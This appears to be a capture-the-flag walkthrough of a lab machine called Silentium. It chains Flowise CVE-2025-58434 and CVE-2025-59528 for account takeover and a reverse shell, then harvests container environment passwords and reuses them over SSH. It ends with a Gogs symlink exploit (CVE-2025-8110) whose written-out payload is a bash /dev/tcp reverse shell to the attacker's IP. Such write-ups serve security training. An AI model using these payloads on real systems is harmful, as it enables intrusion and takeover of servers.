<img width="1193" height="685" alt="image" src="https://github.com/user-attachments/assets/a0eb4e40-ef4e-49d3-85e9-7afb62793cd3" />

## Target Information

- **Target IP:** `10.129.47.191`
- **Attacker IP (Kali):** `10.10.15.1`
- **Operating System:** Linux (Debian/Alpine-based containers)
- **Difficulty:** Medium/Hard (Multi-stage pivoting)

## I. Phase 1: Reconnaissance & Enumeration

The first step was to identify the attack surface by scanning for open ports and services.

### Step 1: Initial Service Scanning

We performed an aggressive Nmap scan to identify running services and versions.

<img width="802" height="319" alt="image" src="https://github.com/user-attachments/assets/d1e35a20-b91a-4699-aa1e-b9d2d2956f42" />

**22/tcp** `open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15`

**80/tcp** `open  http    nginx 1.24.0 (Ubuntu)`

http-title: Did not follow redirect to [`http://silentium.htb/`](http://silentium.htb/)

<img width="538" height="59" alt="image" src="https://github.com/user-attachments/assets/0dd08806-0f9c-4b36-92dd-a67f6ee90863" />

**Analysis:** The web server on port 80 redirects to a domain. To proceed, we added `10.129.47.191 silentium.htb` to our `/etc/hosts` file.

### Step 2: Virtual Host Discovery

Since the main page was relatively static, we looked for hidden subdomains or virtual hosts using **Gobuster**.

<img width="838" height="588" alt="image" src="https://github.com/user-attachments/assets/5d1a2eef-b19b-4411-a3d3-d3dacb8b8f02" />

**Output Highlights:**

> Found: **staging.silentium.htb** Status: 200 [Size: 3142]
> 

<img width="684" height="57" alt="image" src="https://github.com/user-attachments/assets/f761f09e-69c9-4c1b-af4f-c28634cf5fbd" />

**Analysis:** We added `staging.silentium.htb` to `/etc/hosts`. Browsing to this subdomain revealed a **Flowise AI** instance, a critical point of interest.

## Phase 2: Vulnerability Research & Chaining

Once the **Flowise AI** instance was discovered on the staging subdomain, the next objective was to identify the specific version and search for known exploits.

### Step 3: Application Fingerprinting

We performed a version check against the Flowise API to determine the patch level of the instance.

<img width="479" height="67" alt="image" src="https://github.com/user-attachments/assets/e31de62a-02c0-4129-8c5f-f5f3d1b72745" />

**Analysis:** Version **3.0.5** was identified as highly vulnerable to a specific exploit chain discovered in early 2025, specifically targeting the authentication mechanism and the Custom MCP node functionality.

### Step 4: Vulnerability Identification

Research into version `3.0.5` led to the discovery of two linked CVEs. We identified a specialized Proof of Concept (PoC) repository: `AzureADTrent/CVE-2025-58434-59528`. [AzureADTrent/CVE-2025-58434-59528: CVE-2025-58434 and CVE-2025-59528 chain POC](https://github.com/AzureADTrent/CVE-2025-58434-59528)

| **CVE ID** | **Vulnerability Type** | **Impact** |
| --- | --- | --- |
| **CVE-2025-58434** | Information Disclosure | Leaks password reset tokens via internal mailers/logs. |
| **CVE-2025-59528** | Authenticated RCE | Allows command injection via the `CustomMCP` node. |

## Phase 3: Initial Access (Exploitation Chain)

With the **Flowise 3.0.5** version confirmed, we moved forward with an automated exploitation script to chain the **Account Takeover (ATO)** and **Remote Code Execution (RCE)**.

### Step 4: Executing the Flowise Chain

We utilized `flowise_chain.py` to automate the reset of Ben's account and trigger a reverse shell callback.

<img width="908" height="625" alt="image" src="https://github.com/user-attachments/assets/c6b92751-ed3d-48ab-87f7-a160555777d4" />

**Output Analysis:**

- **ATO Success:** The script successfully requested a reset token for the user 'admin' (linked to `ben@silentium.htb`) and reset the password to `Pwn3d!2026`.
- **Manual Intervention:** Due to the synchronization quirk in version 3.0.5, we manually logged into the UI to retrieve the **API Key** E**xtracted Key:** `hWp_8jB76zi0VtKSr2d9TfGK1fm6NuNPg1uA-8FsUJc)`

<img width="957" height="489" alt="image" src="https://github.com/user-attachments/assets/978d2c44-b049-4c24-930a-07ed8cb2cf63" />

- **RCE Trigger:** The script used the API key to deploy a malicious Chatflow and trigger the shell.

### Step 5: Catching the Shell

We established a Netcat listener on port **4444** and successfully received a callback.

<img width="552" height="118" alt="image" src="https://github.com/user-attachments/assets/58f68150-44f1-4118-83cc-0411d3593f45" />

## Phase 4: Container Enumeration & Escape Analysis

Once inside, we performed system enumeration to determine our environment and look for the user flag.

### Step 6: Environment Identification

<img width="622" height="180" alt="image" src="https://github.com/user-attachments/assets/4859baf8-5d79-45d7-a54c-35ddbbff22a7" />

We confirmed we were inside a Docker container rather than the host machine.

- **OS Check:** `/etc/os-release` confirmed **Alpine Linux v3.22**.
- **Docker Presence:** Found `/.dockerenv` at the root directory.
- **Hostname:** The random string `c78c3cceb7ba` confirmed containerization.

## Phase 5: Credential Harvesting (The Pivot)

Since a direct container escape via mounting failed, we pivoted to **Information Gathering** within the environment variables.

### Step 7: Environment Variable Analysis

The `env` command revealed the "keys to the kingdom"—cleartext credentials used for the Flowise service and its internal SMTP communication.

<img width="617" height="501" alt="image" src="https://github.com/user-attachments/assets/29b08f71-46f0-4d84-91f2-3aef01e090be" />

**Key Discoveries:**

| **Variable** | **Value** |
| --- | --- |
| **FLOWISE_USERNAME** | `ben` |
| **FLOWISE_PASSWORD** | `F1l3_d0ck3r` |
| **SMTP_PASSWORD** | `r04D!!_R4ge` |
| **SENDER_EMAIL** | `ben@silentium.htb` |

## Phase 6: Pivot to Host (User Flag)

After identifying that the initial shell was restricted within a Docker container, the focus shifted to finding credentials that would allow for a lateral move to the main host system.

### Step 8: Escaping the Container (The SSH Pivot)

The `env` command inside the container revealed cleartext passwords. In environments where developers manage multiple services, password reuse is a common misconfiguration.

- **Credentials Tested:** `ben : F1l3_d0ck3r`
- **Target IP:** `10.129.47.191` (The host machine)

<img width="717" height="610" alt="image" src="https://github.com/user-attachments/assets/c8b6d003-fe21-443d-aa12-84aac2aa0be4" />

**Output Analysis:**

- Initial attempts were made to verify the correct password among the harvested strings.
- The third attempt using the **`F1l3_d0ck3r`** password was successful.
- **Banner Info:** Confirmed we migrated from an Alpine Docker container to a full **Ubuntu 24.04.4 LTS** host system.

### Step 9: Host Enumeration & User Flag

Once the SSH session was established as the user **ben**, the home directory was explored to locate the user's proof of compromise.

<img width="637" height="194" alt="image" src="https://github.com/user-attachments/assets/7636304e-96f1-4ee6-a1cb-075979879659" />

**User Flag:** `ed4b1d0301bbd65a8bc173e35d597f35`

## Phase 7: Privilege Escalation (The Path to Root)

With user-level access secured on the host, the next objective was to identify a path to the administrative (root) account.

### Step 10: Internal Service Enumeration

Standard privilege escalation checks (such as `sudo -l`) were performed.

<img width="460" height="52" alt="image" src="https://github.com/user-attachments/assets/cc3e50fc-ba66-4298-86d0-d032e6f2a7d2" />

**Analysis:** Since **ben** had no sudo privileges, enumeration shifted toward local listening services and background processes. 

## Phase 8: Privilege Escalation (Host Enumeration)

After successfully pivoting to the host as the user **ben**, we performed deep system enumeration to identify misconfigurations.

### Step 11: Internal Service & Process Analysis

We used `ss` to check for internal services that were not visible from the outside network.

<img width="1100" height="210" alt="image" src="https://github.com/user-attachments/assets/838449dd-c088-4069-bc01-c448527f279a" />

**Output Analysis:**
We discovered several critical services listening only on the loopback interface (`127.0.0.1`):

- **Port 3001:** Identified as **Gogs** (Git Service).
- **Port 8025:** Identified as **MailHog** (Mail Catcher).
- **Port 3000:** The internal Flowise instance.

We then checked which user was running these services.

<img width="1141" height="355" alt="image" src="https://github.com/user-attachments/assets/a8085975-cc66-48c4-8ac9-6df1ba509c8e" />

**Critical Observation:**
The Gogs service was running with full **root** privileges:

> `root 1458 ... /opt/gogs/gogs/gogs web`
> 

This meant that any Remote Code Execution (RCE) achieved through Gogs would result in an immediate **Root Shell**.

## Phase 9: Gogs Exploitation (CVE-2025-8110)

### Step 12: SSH Port Forwarding

To access the internal web panels, we created an SSH tunnel from our Kali machine to the target.

<img width="714" height="345" alt="image" src="https://github.com/user-attachments/assets/456c1e0d-ff1c-4478-b974-08a7746f20ad" />

### Step 13: Bypassing Authentication

We attempted to log into Gogs at `http://127.0.0.1:3001` using the previously found passwords, but both failed. Password reset was also disabled. However, **public registration** was open.

1. **Action:** Navigated to `/user/sign_up`.
2. **Account Created:** Username `bytebandit`, Password `Pwned!2026`.
3. **Token Generation:** Navigated to **Settings > Applications** and generated a Personal Access Token: `3312c08626134a7f828527f83374f53fdb538e04`.
    
<img width="958" height="502" alt="image" src="https://github.com/user-attachments/assets/70031a6c-da9d-491f-ba88-3c629075049a" />
    

### Step 14: Executing the Root Exploit

We utilized a Python PoC for **CVE-2025-8110**, which targets a symlink bypass in the Gogs API to poison the repository's `.git/config`.

**Exploit Mechanism:**
The script creates a repository and pushes a symbolic link pointing to the internal `.git/config`. It then uses the API to overwrite that config with a malicious `sshCommand` payload:
`sshCommand = bash -c 'bash -i >& /dev/tcp/10.10.15.1/6666 0>&1' #`

<img width="992" height="570" alt="image" src="https://github.com/user-attachments/assets/046879bc-2d8b-4e58-82f9-3ceda3a20e20" />

## Phase 10: Final Compromise (Root Flag)

### Step 17: Catching the Root Shell

Upon the script's completion, the Gogs service executed the injected command. Since the process was owned by root, the shell returned with maximum privileges.

<img width="817" height="199" alt="image" src="https://github.com/user-attachments/assets/91594182-c9e3-4474-a080-1d7e9660935a" />

**Flag Retrieval:** 

`ebc4a27bae36be3600523e1c47ecbf09`
